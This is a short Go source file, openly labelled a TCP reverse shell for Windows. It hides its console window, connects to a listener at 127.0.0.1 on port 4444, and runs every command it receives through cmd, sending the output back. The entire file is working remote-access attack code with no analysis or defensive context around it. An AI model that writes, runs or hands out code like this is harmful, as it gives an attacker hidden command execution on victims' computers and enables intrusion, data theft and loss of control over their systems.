//GO based TCP reverse shell
package main

import (
	"bufio"
	"net"
	"os/exec"
	"syscall"
	
)

var (
	modkernel32 = syscall.NewLazyDLL("kernel32.dll")
	moduser32   = syscall.NewLazyDLL("user32.dll")

	procGetConsoleWindow = modkernel32.NewProc("GetConsoleWindow")
	procShowWindow       = moduser32.NewProc("ShowWindow")
)

const (
	SW_HIDE = 0
)

func hideConsoleWindow() {
	consoleWindow, _, _ := procGetConsoleWindow.Call()
	if consoleWindow != 0 {
		_, _, _ = procShowWindow.Call(consoleWindow, uintptr(SW_HIDE))
	}
}

func main() {
	hideConsoleWindow()

	conn, err := net.Dial("tcp", "127.0.0.1:4444")
	if err != nil {
		panic(err)
	}

	for {
		message, err := bufio.NewReader(conn).ReadString('\n')
		if err != nil {
			panic(err)
		}

		cmd := exec.Command("cmd", "/C", message)
		output, err := cmd.Output()
		if err != nil {
			conn.Write([]byte(err.Error() + "\n"))
		} else {
			conn.Write(output)
		}
	}
}
